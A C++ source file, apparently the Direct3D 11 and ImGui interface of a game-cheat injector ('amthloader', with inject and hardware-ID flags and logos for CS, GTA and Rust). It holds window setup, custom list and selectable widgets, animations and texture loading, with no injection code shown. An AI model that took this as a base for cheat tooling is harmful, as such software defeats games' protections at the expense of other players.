		const float o1 = (circleWidth + r) * (t + a - speed * (int)((t + a) / speed)) / speed;
		const float o2 = (circleWidth + r) * (t + b - speed * (int)((t + b) / speed)) / speed;
		const float o3 = (circleWidth + r) * (t + c - speed * (int)((t + c) / speed)) / speed;
		window->DrawList->AddCircleFilled(ImVec2(pos.x + circleEnd - o1, bb.Min.y + r), r, bg_col);
		window->DrawList->AddCircleFilled(ImVec2(pos.x + circleEnd - o2, bb.Min.y + r), r, bg_col);
		window->DrawList->AddCircleFilled(ImVec2(pos.x + circleEnd - o3, bb.Min.y + r), r, bg_col);
	}
	const wchar_t* GetWC(const char* c)
	{
		const size_t cSize = strlen(c) + 1;
		wchar_t* wc = new wchar_t[cSize];
		mbstowcs(wc, c, cSize);
		return wc;
	}
	void start(const char* text, const char* text2, bool* done)
	{
		if (!done)
			show_popup = true;
		if (&show_popup)
		{
			if (timer < 5000)
			{
				if (alpha < 255)
					alpha = alpha + 5;
				if (alpha2 < 255)
					alpha2 = alpha2 + 8;
			}
			if (timer < 5000)
				timer = timer + 20;
			if (timer > 5000)
				timer = 5000;
			/*if (timer >= 5000)
			{
				if (alpha > 0)
					alpha = alpha - 5;
				if (alpha2 > 0)
					alpha2 = alpha2 - 8;

				if (alpha <= 0 && alpha2 <= 0)
				{
					alpha = 0;
					timer = -1;
					show_popup = false;
					*done = true;
				}
			}*/
			if (timer <= 5000 && alpha > 0 && alpha2 > 0)
			{
				const auto vp_size = ImVec2(400.f + 360.f, 370);

				auto window = ImGui::GetForegroundDrawList();

				ImGuiContext& g = *GImGui;
				window->PathClear();

				//window->AddRectFilled({ position.x,position.y }, { position.x + ImGui::GetWindowSize().x, position.y + ImGui::GetWindowSize().y }, ImGui::GetColorU32(ImVec4(c::bg::background.x, c::bg::background.y, c::bg::background.z, (float)alpha)), c::bg::rounding);
				
				window->AddRectFilledMultiColor({ position.x,position.y }, { position.x + vp_size.x, position.y + vp_size.y }, ImColor(0, 0, 0, alpha), ImColor(0, 0, 0, alpha), ImColor(0, 0, 0, alpha), ImColor(0, 0, 0, alpha)); //dark		
				

				ImGui::PushFont(font::poppins_medium);
				window->AddText( { (position.x + (vp_size.x / 2.05f)) - ImGui::CalcTextSize(text).x / 2, (position.y + (vp_size.y / 2.3f)) - ImGui::CalcTextSize(text2).y / 2 }, ImColor(255, 255, 255, alpha2), text);
				ImGui::PopFont();

			}
		}
	}
}
static bool inject_success = false;
static bool HWIDERROR_success = false;
static bool USERNAMEORPASSWORDERROR = false;
static bool activation_success = false;
bool goodbye_success = false;
static float switch_alpha[3], open_alpha = 0;
static int selected_tab = 0;
ImFont* fontbigg;
#define IM_USE using namespace ImGui; 




static bool languages = true;


void CleanupRenderTarget()
{
	if (g_mainRenderTargetView) { g_mainRenderTargetView->Release(); g_mainRenderTargetView = nullptr; }
}

void CleanupDeviceD3D()
{
	CleanupRenderTarget();
	if (g_pSwapChain) { g_pSwapChain->Release(); g_pSwapChain = nullptr; }
	if (g_pd3dDeviceContext) { g_pd3dDeviceContext->Release(); g_pd3dDeviceContext = nullptr; }
	if (g_pd3dDevice) { g_pd3dDevice->Release(); g_pd3dDevice = nullptr; }
}

void CreateRenderTarget()
{
	ID3D11Texture2D* pBackBuffer;
	g_pSwapChain->GetBuffer(0, IID_PPV_ARGS(&pBackBuffer));
	g_pd3dDevice->CreateRenderTargetView(pBackBuffer, nullptr, &g_mainRenderTargetView);
	pBackBuffer->Release();
}
bool CreateDeviceD3D(HWND hWnd)
{
	DXGI_SWAP_CHAIN_DESC sd;
	ZeroMemory(&sd, sizeof(sd));
	sd.BufferCount = 2;
	sd.BufferDesc.Width = 0;
	sd.BufferDesc.Height = 0;
	sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
	sd.BufferDesc.RefreshRate.Numerator = 60;
	sd.BufferDesc.RefreshRate.Denominator = 1;
	sd.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;
	sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;
	sd.OutputWindow = hWnd;
	sd.SampleDesc.Count = 1;
	sd.SampleDesc.Quality = 0;
	sd.Windowed = TRUE;
	sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;

	UINT createDeviceFlags = 0;
	D3D_FEATURE_LEVEL featureLevel;
	const D3D_FEATURE_LEVEL featureLevelArray[2] = { D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0, };
	HRESULT res = D3D11CreateDeviceAndSwapChain(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, createDeviceFlags, featureLevelArray, 2, D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
	if (res == DXGI_ERROR_UNSUPPORTED)
		res = D3D11CreateDeviceAndSwapChain(nullptr, D3D_DRIVER_TYPE_WARP, nullptr, createDeviceFlags, featureLevelArray, 2, D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
	if (res != S_OK)
		return false;

	CreateRenderTarget();
	return true;
}




namespace image
{
	ID3D11ShaderResourceView* bg = nullptr;
	ID3D11ShaderResourceView* logo = nullptr;
	ID3D11ShaderResourceView* logo_general = nullptr;

	ID3D11ShaderResourceView* arrow = nullptr;
	ID3D11ShaderResourceView* bell_notify = nullptr;
	ID3D11ShaderResourceView* roll = nullptr;

	ID3D11ShaderResourceView* rusifikacia = nullptr;
	ID3D11ShaderResourceView* rusifikacia_ru = nullptr;
	ID3D11ShaderResourceView* discord_logo = nullptr;
	ID3D11ShaderResourceView* telegram_logo = nullptr;
	ID3D11ShaderResourceView* vk_logo = nullptr;
	ID3D11ShaderResourceView* site_logo = nullptr;
	ID3D11ShaderResourceView* exit_logo = nullptr;

	ID3D11ShaderResourceView* logo_cs = nullptr;
	ID3D11ShaderResourceView* logo_gta = nullptr;
	ID3D11ShaderResourceView* logo_rust = nullptr;
	ID3D11ShaderResourceView* krest = nullptr;
	ID3D11ShaderResourceView* Injectong = nullptr;


}
D3DX11_IMAGE_LOAD_INFO info; ID3DX11ThreadPump* pump{ nullptr };
DWORD picker_flags = ImGuiColorEditFlags_NoSidePreview | ImGuiColorEditFlags_AlphaBar | ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_AlphaPreview;

float arrow_roll = 0.f;
bool tab_opening = false;

void init_styles(ImGuiStyle& style)
{
	style.Colors[ImGuiCol_Border] = ImVec4(c::text::text.x, c::text::text.y, c::text::text.z, c::text::text.w / 2);
	style.Colors[ImGuiCol_FrameBg] = ImColor(43, 63, 90, 1);


	style.Colors[ImGuiCol_Text] = ImVec4(c::text::text_hov.x, c::text::text_hov.y, c::text::text_hov.z, c::text::text_hov.w / 2);

}
#include "../amthloader/ImSpinner.h"


#include"font.h"

#include <chrono>
#include <thread>


//auto start = std::chrono::high_resolution_clock::now();
//auto stop = std::chrono::high_resolution_clock::now();
//auto duration = std::chrono::duration_cast<std::chrono::microseconds>(stop - start);
LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
		return true;

	switch (msg)
	{
	case WM_SIZE:
		if (wParam == SIZE_MINIMIZED)
			return 0;
		g_ResizeWidth = (UINT)LOWORD(lParam);
		g_ResizeHeight = (UINT)HIWORD(lParam);
		return 0;

	case WM_SYSCOMMAND:
		if ((wParam & 0xfff0) == SC_KEYMENU) return NULL;
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		return NULL;
	case WM_NCHITTEST:
		POINT pt;
		RECT windowPos;
		GetWindowRect(hWnd, &windowPos);
		static RECT r1;
		r1.left = 0;
		r1.right = windowPos.right - windowPos.left;
		r1.top = 0;
		r1.bottom = 40;
		GetCursorPos(&pt);
		ScreenToClient(hWnd, &pt);
		LRESULT result = DefWindowProc(hWnd, msg, wParam, lParam);
		if ((int)r1.bottom > (int)pt.y)
		{
			if (result == HTCLIENT) result = HTCAPTION;
		}
		return result;
	}
	return DefWindowProc(hWnd, msg, wParam, lParam);
}


std::map<ImGuiID, ImVec4> hover_color;
IMGUI_API bool          CustomSelectable(const char* label, bool selected = false, ImGuiSelectableFlags flags = 0, const ImVec2& size = ImVec2(0, 0));
bool CustomSelectable(const char* label, bool selected, ImGuiSelectableFlags flags, const ImVec2& size_arg)
{
	ImGuiWindow* window = ImGui::GetCurrentWindow();
	if (window->SkipItems)
		return false;

	ImGuiContext& g = *GImGui;
	const ImGuiStyle& style = g.Style;

	if ((flags & ImGuiSelectableFlags_SpanAllColumns) && window->DC.CurrentColumns) // FIXME-OPT: Avoid if vertically clipped.
		ImGui::PushColumnsBackground();

	// Submit label or explicit size to ItemSize(), whereas ItemAdd() will submit a larger/spanning rectangle.
	ImGuiID id = window->GetID(label);
	ImVec2 label_size = ImGui::CalcTextSize(label, NULL, true);
	ImVec2 size(size_arg.x != 0.0f ? size_arg.x : label_size.x, size_arg.y != 0.0f ? size_arg.y : label_size.y);
	ImVec2 pos = window->DC.CursorPos;
	pos.y += window->DC.CurrLineTextBaseOffset;
	ImGui::ItemSize(size, 0.0f);

	// Fill horizontal space
	const float min_x = (flags & ImGuiSelectableFlags_SpanAllColumns) ? window->ContentRegionRect.Min.x : pos.x;
	const float max_x = (flags & ImGuiSelectableFlags_SpanAllColumns) ? window->ContentRegionRect.Max.x : ImGui::GetContentRegionMaxAbs().x;
	if (size_arg.x == 0.0f || (flags & ImGuiSelectableFlags_SpanAvailWidth))
		size.x = ImMax(label_size.x, max_x - min_x);

	// Text stays at the submission position, but bounding box may be extended on both sides
	const ImVec2 text_min = pos;
	const ImVec2 text_max(min_x + size.x, pos.y + size.y);

	// Selectables are meant to be tightly packed together with no click-gap, so we extend their box to cover spacing between selectable.
	ImRect bb_enlarged(min_x, pos.y, text_max.x, text_max.y);
	const float spacing_x = style.ItemSpacing.x;
	const float spacing_y = style.ItemSpacing.y;
	const float spacing_L = IM_FLOOR(spacing_x * 0.50f);
	const float spacing_U = IM_FLOOR(spacing_y * 0.50f);
	bb_enlarged.Min.x -= spacing_L;
	bb_enlarged.Min.y -= spacing_U;
	bb_enlarged.Max.x += (spacing_x - spacing_L);
	bb_enlarged.Max.y += (spacing_y - spacing_U);
	//if (g.IO.KeyCtrl) { GetForegroundDrawList()->AddRect(bb_align.Min, bb_align.Max, IM_COL32(255, 0, 0, 255)); }
	//if (g.IO.KeyCtrl) { GetForegroundDrawList()->AddRect(bb_enlarged.Min, bb_enlarged.Max, IM_COL32(0, 255, 0, 255)); }

	bool item_add;
	if (flags & ImGuiSelectableFlags_Disabled)
	{
		ImGuiItemFlags backup_item_flags = window->DC.ItemFlags;
		window->DC.ItemFlags |= ImGuiItemFlags_Disabled | ImGuiItemFlags_NoNavDefaultFocus;
		item_add = ImGui::ItemAdd(bb_enlarged, id);
		window->DC.ItemFlags = backup_item_flags;
	}
	else
	{
		item_add = ImGui::ItemAdd(bb_enlarged, id);
	}
	if (!item_add)
	{
		if ((flags & ImGuiSelectableFlags_SpanAllColumns) && window->DC.CurrentColumns)
			ImGui::PopColumnsBackground();
		return false;
	}

	// We use NoHoldingActiveID on menus so user can click and _hold_ on a menu then drag to browse child entries
	ImGuiButtonFlags button_flags = 0;
	if (flags & ImGuiSelectableFlags_NoHoldingActiveID) { button_flags |= ImGuiButtonFlags_NoHoldingActiveId; }
	if (flags & ImGuiSelectableFlags_SelectOnNav) { button_flags |= ImGuiButtonFlags_PressedOnClick; }
	if (flags & ImGuiSelectableFlags_SelectOnClick) { button_flags |= ImGuiButtonFlags_PressedOnRelease; }
	if (flags & ImGuiSelectableFlags_Disabled) { button_flags |= ImGuiButtonFlags_Disabled; }
	if (flags & ImGuiSelectableFlags_AllowDoubleClick) { button_flags |= ImGuiButtonFlags_PressedOnClickRelease | ImGuiButtonFlags_PressedOnDoubleClick; }
	if (flags & ImGuiSelectableFlags_AllowItemOverlap) { button_flags |= ImGuiButtonFlags_AllowItemOverlap; }

	if (flags & ImGuiSelectableFlags_Disabled)
		selected = false;

	const bool was_selected = selected;
	bool hovered, held;
	bool pressed = ImGui::ButtonBehavior(bb_enlarged, id, &hovered, &held, button_flags);

	// Update NavId when clicking or when Hovering (this doesn't happen on most widgets), so navigation can be resumed with gamepad/keyboard
	if (pressed || (hovered && (flags & ImGuiSelectableFlags_SetNavIdOnHover)))
	{
		if (!g.NavDisableMouseHover && g.NavWindow == window && g.NavLayer == window->DC.NavLayerCurrent)
		{
			g.NavDisableHighlight = true;
			ImGui::SetNavID(id, window->DC.NavLayerCurrent);
		}
	}
	if (pressed)
		ImGui::MarkItemEdited(id);

	if (flags & ImGuiSelectableFlags_AllowItemOverlap)
		ImGui::SetItemAllowOverlap();

	// In this branch, Selectable() cannot toggle the selection so this will never trigger.
	if (selected != was_selected) //-V547
		window->DC.LastItemStatusFlags |= ImGuiItemStatusFlags_ToggledSelection;

	const ImVec4 text_act = ImColor(c::menu_sett::menu_color_swither);
	const ImVec4 text_hov = ImVec4(251 / 255.f, 251 / 255.f, 251 / 255.f, 1.f);
	const ImVec4 text_dis = ImVec4(202 / 255.f, 202 / 255.f, 202 / 255.f, 1.f);
	float deltatime = 1.5f * ImGui::GetIO().DeltaTime;

	//typedef std::map<ImGuiID, ImVec4> MyMap;
	//MyMap hover_color;

	 //std::map<ImGuiID, ImVec4> hover_color;
	auto it_hcolor = hover_color.find(id);
	if (it_hcolor == hover_color.end())
	{
		hover_color.insert({ id, text_dis });
		it_hcolor = hover_color.find(id);
	}

	if (hovered || selected)
	{
		ImVec4 to = (hovered && !selected) ? text_hov : text_act;
		if (it_hcolor->second.x != to.x)
		{
			if (it_hcolor->second.x < to.x)
				it_hcolor->second.x = ImMin(it_hcolor->second.x + deltatime, to.x);
			else if (it_hcolor->second.x > to.x)
				it_hcolor->second.x = ImMax(to.x, it_hcolor->second.x - deltatime);
		}

		if (it_hcolor->second.y != to.y)
		{
			if (it_hcolor->second.y < to.y)
				it_hcolor->second.y = ImMin(it_hcolor->second.y + deltatime, to.y);
			else if (it_hcolor->second.y > to.y)
				it_hcolor->second.y = ImMax(to.y, it_hcolor->second.y - deltatime);
		}

		if (it_hcolor->second.z != to.z)
		{
			if (it_hcolor->second.z < to.z)
				it_hcolor->second.z = ImMin(it_hcolor->second.z + deltatime, to.z);
			else if (it_hcolor->second.z > to.z)
				it_hcolor->second.z = ImMax(to.z, it_hcolor->second.z - deltatime);
		}
	}
	else
	{
		ImVec4 to = text_dis;
		if (it_hcolor->second.x != to.x)
		{
			if (it_hcolor->second.x < to.x)
				it_hcolor->second.x = ImMin(it_hcolor->second.x + deltatime, to.x);
			else if (it_hcolor->second.x > to.x)
				it_hcolor->second.x = ImMax(to.x, it_hcolor->second.x - deltatime);
		}

		if (it_hcolor->second.y != to.y)
		{
			if (it_hcolor->second.y < to.y)
				it_hcolor->second.y = ImMin(it_hcolor->second.y + deltatime, to.y);
			else if (it_hcolor->second.y > to.y)
				it_hcolor->second.y = ImMax(to.y, it_hcolor->second.y - deltatime);
		}

		if (it_hcolor->second.z != to.z)
		{
			if (it_hcolor->second.z < to.z)
				it_hcolor->second.z = ImMin(it_hcolor->second.z + deltatime, to.z);
			else if (it_hcolor->second.z > to.z)
				it_hcolor->second.z = ImMax(to.z, it_hcolor->second.z - deltatime);
		}
	}

	// Render
	if (held && (flags & ImGuiSelectableFlags_DrawHoveredWhenHeld))
		hovered = true;


	if ((flags & ImGuiSelectableFlags_SpanAllColumns) && window->DC.CurrentColumns)
		ImGui::PopColumnsBackground();

	ImGui::PushStyleColor(ImGuiCol_Text, it_hcolor->second);
	ImGui::RenderTextClipped(text_min, text_max, label, NULL, &label_size, ImVec2(0.f, 0.5f), &bb_enlarged);
	ImGui::PopStyleColor();

	//ImGui::SetWindowFontScale(c_menu::get().dpi_scale);

	// Automatically close popups
	if (pressed && (window->Flags & ImGuiWindowFlags_Popup) && !(flags & ImGuiSelectableFlags_DontClosePopups) && !(window->DC.ItemFlags & ImGuiItemFlags_SelectableDontClosePopup))
		ImGui::CloseCurrentPopup();

	IMGUI_TEST_ENGINE_ITEM_INFO(id, label, window->DC.ItemFlags);
	return pressed;
}
IMGUI_API bool          ListBoxHeader(const char* label, int items_count, int height_in_items = -1);
bool ListBoxHeader(const char* label, const ImVec2& size_arg)
{
	ImGuiContext& g = *GImGui;
	ImGuiWindow* window = ImGui::GetCurrentWindow();
	if (window->SkipItems)
		return false;

	const ImGuiStyle& style = g.Style;
	const ImGuiID id = ImGui::GetID(label);
	const ImVec2 label_size = ImGui::CalcTextSize(label, NULL, true);

	// Size default to hold ~7 items. Fractional number of items helps seeing that we can scroll down/up without looking at scrollbar.
	ImVec2 size = ImGui::CalcItemSize(size_arg, ImGui::CalcItemWidth(), ImGui::GetTextLineHeightWithSpacing() * 7.4f + style.ItemSpacing.y);
	ImVec2 frame_size = ImVec2(size.x, ImMax(size.y, label_size.y));
	ImRect frame_bb(window->DC.CursorPos, window->DC.CursorPos + frame_size);
	ImRect bb(frame_bb.Min, frame_bb.Max + ImVec2(label_size.x > 0.0f ? style.ItemInnerSpacing.x + label_size.x : 0.0f, 0.0f));
	window->DC.LastItemRect = bb; // Forward storage for ListBoxFooter.. dodgy.
	g.NextItemData.ClearFlags();

	if (!ImGui::IsRectVisible(bb.Min, bb.Max))
	{
		ImGui::ItemSize(bb.GetSize(), style.FramePadding.y);
		ImGui::ItemAdd(bb, 0, &frame_bb);
		return false;
	}

	ImGui::BeginGroup();
	if (label_size.x > 0)
		ImGui::RenderText(ImVec2(frame_bb.Max.x + style.ItemInnerSpacing.x, frame_bb.Min.y + style.FramePadding.y), label);

	ImGui::BeginChildFrame(id, frame_bb.GetSize());
	return true;
}
bool ListBoxHeader(const char* label, int items_count, int height_in_items)
{
	// Size default to hold ~7.25 items.
	// We add +25% worth of item height to allow the user to see at a glance if there are more items up/down, without looking at the scrollbar.
	// We don't add this extra bit if items_count <= height_in_items. It is slightly dodgy, because it means a dynamic list of items will make the widget resize occasionally when it crosses that size.
	// I am expecting that someone will come and complain about this behavior in a remote future, then we can advise on a better solution.
	if (height_in_items < 0)
		height_in_items = ImMin(items_count, 7);
	const ImGuiStyle& style = ImGui::GetStyle();
	float height_in_items_f = (height_in_items < items_count) ? (height_in_items + 0.25f) : (height_in_items + 0.00f);

	// We include ItemSpacing.y so that a list sized for the exact number of items doesn't make a scrollbar appears. We could also enforce that by passing a flag to BeginChild().
	ImVec2 size;
	size.x = 230;
	size.y = ImFloor(ImGui::GetTextLineHeightWithSpacing() * height_in_items_f + style.FramePadding.y * 2.0f);
	return ListBoxHeader(label, size);
}
void ImGui::ListBoxFooter()
{
	using namespace ImGui;
	ImGuiWindow* parent_window = GetCurrentWindow()->ParentWindow;
	const ImRect bb = parent_window->DC.LastItemRect;
	const ImGuiStyle& style = GetStyle();

	//EndChildFrame();
	ImGui::EndChild_CUSTOM();
	// Redeclare item size so that it includes the label (we have stored the full size in LastItemRect)
	// We call SameLine() to restore DC.CurrentLine* data
	SameLine();
	parent_window->DC.CursorPos = bb.Min;
	ItemSize(bb, style.FramePadding.y);
	EndGroup();
}
bool ListBox(const char* label, int* current_item, bool (*items_getter)(void*, int, const char**), void* data, int items_count, int height_in_items, bool custom_selectable)
{
	if (!ListBoxHeader(label, items_count, height_in_items))
		return false;
	ImGuiContext& g = *GImGui;
	bool value_changed = false;
	ImGuiListClipper clipper;
	clipper.Begin(items_count, ImGui::GetTextLineHeightWithSpacing()); // We know exactly our line height here so we pass it as a minor optimization, but generally you don't need to.
	while (clipper.Step())
		for (int i = clipper.DisplayStart; i < clipper.DisplayEnd; i++)
		{
			const bool item_selected = (i == *current_item);
			const char* item_text;
			if (!items_getter(data, i, &item_text))
				item_text = "*Unknown item*";

			ImGui::PushID(i);
			if (custom_selectable ? CustomSelectable(item_text, item_selected) : ImGui::Selectable(item_text, item_selected))
				//  if (custom_selectable ? ImGui::Selectable(item_text, item_selected) : ImGui::Selectable(item_text, item_selected)) //fix xD
			{
				*current_item = i;
				value_changed = true;
			}
			if (item_selected)
				ImGui::SetItemDefaultFocus();
			ImGui::PopID();
		}

	ImGui::ListBoxFooter();
	if (value_changed)
		ImGui::MarkItemEdited(g.CurrentWindow->DC.LastItemId);

	return value_changed;
}
static auto vector_getter = [](void* vec, int idx, const char** out_text)
	{
		auto& vector = *static_cast<std::vector<std::string>*>(vec);
		if (idx < 0 || idx >= static_cast<int>(vector.size())) { return false; }
		*out_text = vector.at(idx).c_str();
		return true;
	};

bool ListBoxConfigArray(const char* label, int* currIndex, std::vector<std::string>& values, int height, bool custom_selectable)
{
	return ListBox(label, currIndex, vector_getter,
		static_cast<void*>(&values), values.size(), height, custom_selectable);
}

void Particles()
{
	ImVec2 screen_size = ImVec2(c::bg::size.x, c::bg::size.y + 20);

	static ImVec2 partile_pos[100];
	static ImVec2 partile_target_pos[100];
	static float partile_speed[100];
	static float partile_radius[100];

	for (int i = 1; i < 4; i++)
	{

		if (partile_pos[i].x == 0 || partile_pos[i].y == 0)
		{
			partile_pos[i].x = rand() % (int)screen_size.x + 1;
			partile_pos[i].y = 15.f;
			partile_speed[i] = 1 + rand() % 25;
			partile_radius[i] = rand() % 16;

			partile_target_pos[i].x = rand() % (int)screen_size.x;
			partile_target_pos[i].y = screen_size.y * 2;

		}


		partile_pos[i] = ImLerp(partile_pos[i], partile_target_pos[i], ImGui::GetIO().DeltaTime * (partile_speed[i] / 60));

		if (partile_pos[i].y > screen_size.y)
		{
			partile_pos[i].x = 0;
			partile_pos[i].y = 0;
		}
		//if (ImGui::CustomButton(1, image::roll, ImVec2(20, 20), ImVec2(0, 0), ImVec2(1, 1), ImGui::GetColorU32(ImVec4(c::menu_sett::menu_color_swither.Value.x, c::menu_sett::menu_color_swither.Value.y, c::menu_sett::menu_color_swither.Value.z, 255.f)))) sosihui = !sosihui;
		ImGui::GetWindowDrawList()->AddImage(image::roll, partile_pos[i] - ImVec2(partile_radius[i], partile_radius[i]), partile_pos[i] + ImVec2(partile_radius[i], partile_radius[i]), ImVec2(0, 0), ImVec2(1, 1), ImColor(c::menu_sett::menu_color_swither.Value.x, c::menu_sett::menu_color_swither.Value.y, c::menu_sett::menu_color_swither.Value.z, 255.f));

		// ImGui::GetWindowDrawList()->AddImage(image::arrow, partile_pos[i] + ImVec2(10, 10), partile_pos[i] + ImVec2(10, 10), ImVec2(100, 100), ImVec2(100, 100), ImColor((c::menu_sett::menu_color_swither.Value.x, c::menu_sett::menu_color_swither.Value.y, c::menu_sett::menu_color_swither.Value.z, 255.f)));
		//ImGui::GetWindowDrawList()->AddCircleFilled(partile_pos[i], partile_radius[i], ImColor(c::menu_sett::menu_color_swither.Value.x, c::menu_sett::menu_color_swither.Value.y, c::menu_sett::menu_color_swither.Value.z, 255.f / 2));
	}

}




ATOM RegMyWindowClass(HINSTANCE hInst, LPCTSTR lpzClassName)
{
	WNDCLASS wcWindowClass = { 0 };
	wcWindowClass.lpfnWndProc = (WNDPROC)WndProc;
	wcWindowClass.style = CS_HREDRAW | CS_VREDRAW;
	wcWindowClass.hInstance = hInst;
	wcWindowClass.lpszClassName = lpzClassName;
	wcWindowClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	wcWindowClass.hbrBackground = (HBRUSH)COLOR_APPWORKSPACE;
	return RegisterClass(&wcWindowClass);
}
bool check = false;
bool logined = false;
bool sosihui = false;
ImVec2 window_position;
HWND hWnd;
#include<dos.h>
int selected_config = -1;
int selected_config_test = 0;
int selected_configdgfs = 0;
std::vector <std::string> filesgfd;
bool pidorrrr = false;
std::vector <std::string> files;

std::vector <std::string> rememberlogin;

ID3D11ShaderResourceView* IconAvatar = NULL;
#include "../stb_image.h"
bool LoadTextureFromBytes(std::string bytes, ID3D11ShaderResourceView** out_srv, int* out_width, int* out_height) {
	
	//std::cout << accepted_request << std::endl;

	// Load from disk into a raw RGBA buffer
	int image_width = 0;
	int image_height = 0;
	//unsigned char* image_data = stbi_load(response.data(), &image_width, &image_height, NULL, 4);
	unsigned char* image_data = stbi_load_from_memory((stbi_uc*)bytes.data(), bytes.size(), &image_width, &image_height, NULL, 4);

	if (image_data == NULL)
		return false;
	// Create texture
	D3D11_TEXTURE2D_DESC desc;
	ZeroMemory(&desc, sizeof(desc));
	desc.Width = image_width;
	desc.Height = image_height;
	desc.MipLevels = 1;
	desc.ArraySize = 1;
	desc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
	desc.SampleDesc.Count = 1;
	desc.Usage = D3D11_USAGE_DEFAULT;
	desc.BindFlags = D3D11_BIND_SHADER_RESOURCE;
	desc.CPUAccessFlags = 0;

	ID3D11Texture2D* pTexture = NULL;
	D3D11_SUBRESOURCE_DATA subResource;
	subResource.pSysMem = image_data;
	subResource.SysMemPitch = desc.Width * 4;
	subResource.SysMemSlicePitch = 0;
	g_pd3dDevice->CreateTexture2D(&desc, &subResource, &pTexture);

	// Create texture view
	D3D11_SHADER_RESOURCE_VIEW_DESC srvDesc;
	ZeroMemory(&srvDesc, sizeof(srvDesc));
	srvDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
	srvDesc.ViewDimension = D3D11_SRV_DIMENSION_TEXTURE2D;
	srvDesc.Texture2D.MipLevels = desc.MipLevels;
	srvDesc.Texture2D.MostDetailedMip = 0;
	g_pd3dDevice->CreateShaderResourceView(pTexture, &srvDesc, out_srv);
	pTexture->Release();

	*out_width = image_width;
	*out_height = image_height;
	stbi_image_free(image_data);

	return true;
}
void IconAvatarInit(std::string pathpng)
{
	int LogoWidth = 16;
	int LogoHeight = 16;
	bool ImageLoaded = LoadTextureFromBytes(pathpng, &IconAvatar, &LogoWidth, &LogoHeight);
	IM_ASSERT(ImageLoaded);
}

void HandleUserActivity_thread() {
	while (true)
	{
		HandleUserActivity();
		//Sleep(5);
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}
}